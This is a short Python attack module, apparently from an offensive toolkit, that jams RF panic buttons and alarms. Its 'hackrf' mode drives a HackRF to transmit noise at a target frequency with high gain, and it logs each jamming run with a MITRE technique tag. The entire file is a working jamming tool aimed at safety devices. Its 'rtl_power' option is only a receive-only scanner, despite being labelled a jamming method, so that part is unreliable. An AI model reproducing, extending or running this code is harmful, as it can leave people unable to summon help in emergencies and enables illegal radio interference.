#!/usr/bin/env python3
# modules/attacks/panic_button_signal_jammer.py

import argparse
import time
import os
import subprocess
import json
from datetime import datetime

LOG_FILE = "results/panic_button_jam_log.json"
MITRE_TTP = "T1565.003"

def log_event(freq, duration, method):
    os.makedirs("results", exist_ok=True)
    event = {
        "timestamp": datetime.utcnow().isoformat(),
        "target_frequency": freq,
        "duration": duration,
        "method": method,
        "ttp": MITRE_TTP
    }
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(event) + "\n")

def jam_rf(freq, duration, method):
    print(f"[*] Jamming RF at {freq} MHz for {duration}s using {method}...")
    if method == "hackrf":
        subprocess.run([
            "hackrf_transfer",
            "-f", str(int(float(freq) * 1e6)),
            "-s", "2000000",
            "-b", "2000000",
            "-t", "/dev/zero",
            "-x", "47",
            "-l", "40",
            "-a", "1"
        ], timeout=duration)
    elif method == "rtl_power":
        subprocess.run([
            "rtl_power",
            "-f", f"{float(freq)-0.5}M:{float(freq)+0.5}M:1k",
            "-i", "1",
            "-e", f"{duration}s",
            "-g", "50"
        ])
    log_event(freq, duration, method)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Jams RF-based panic buttons or alarms")
    parser.add_argument("--freq", required=True, help="Target RF frequency (MHz)")
    parser.add_argument("--duration", type=int, default=10, help="Duration of jamming (seconds)")
    parser.add_argument("--method", choices=["hackrf", "rtl_power"], default="hackrf", help="Jamming method")
    args = parser.parse_args()
    jam_rf(args.freq, args.duration, args.method)
